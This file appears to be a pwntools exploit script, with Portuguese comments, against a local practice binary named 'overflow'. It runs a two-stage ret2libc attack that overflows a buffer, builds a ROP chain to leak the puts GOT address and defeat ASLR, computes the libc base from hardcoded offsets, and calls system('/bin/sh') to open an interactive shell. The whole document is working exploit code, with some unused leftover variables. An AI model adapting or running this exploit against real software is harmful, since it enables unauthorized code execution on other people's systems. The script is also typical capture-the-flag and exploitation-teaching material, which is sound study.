import struct
from pwn import *
filename = "./overflow"

p = process(filename)
elf = ELF(filename)

main = p64(elf.symbols['main'])

puts_got = p64(elf.got['puts'])
puts_plt = p64(elf.plt['puts'])
pop_rdi_ret = p64(0x4005c3) 	# ROPCHAIN (NX - ASLR)

junk = b"A"*20
stack = p64(0x7fffffffed00);
nopchain = b"\x90" *20

shellcode = asm(shellcraft.amd64.sh(), arch='amd64')

exploit = junk + pop_rdi_ret + puts_got + puts_plt + main # Chamando puts@plt, pasando como argumento seu got (resolvido ao executar binário, afetado pelo ASLR)

print(p.clean())

expl = exploit

f = open("ret2libc", "wb")

p.sendline(exploit)

received = p.clean().strip()
leak = received[46:52]
print(f"RECEIVED STRING :: {leak}")
leak = u64(leak.ljust(8, b"\x00"))
#gdb.attach(p)

print(f"Leaked @GLIBC :: {hex(leak)}")
int_leak = int(hex(leak), 16)

### SEGUNDA FASE

offset_system = 0x4f550
offset_puts = 0x80aa0
offset_sh = 0x1b3e1a
offset_exit = 0x43240
offset_execl = 0xe4f30
offset_execve = 0xe4c00

# GOT puts - offset puts = base

base_libc = int_leak - offset_puts

system = base_libc + offset_system
sh = base_libc + offset_sh
exit = base_libc + offset_exit
execl = base_libc + offset_execl
execve = base_libc + offset_execve

pop_rsi_r15 = p64(0x4005c1)

print(f"LIBC BASE :: {base_libc}\nSYSTEM :: {system}\n/bin/sh :: {sh}")
gdb.attach(p)
exploit2 = junk + pop_rdi_ret + p64(sh) + p64(system) + main


p.sendline(exploit2)
p.interactive()
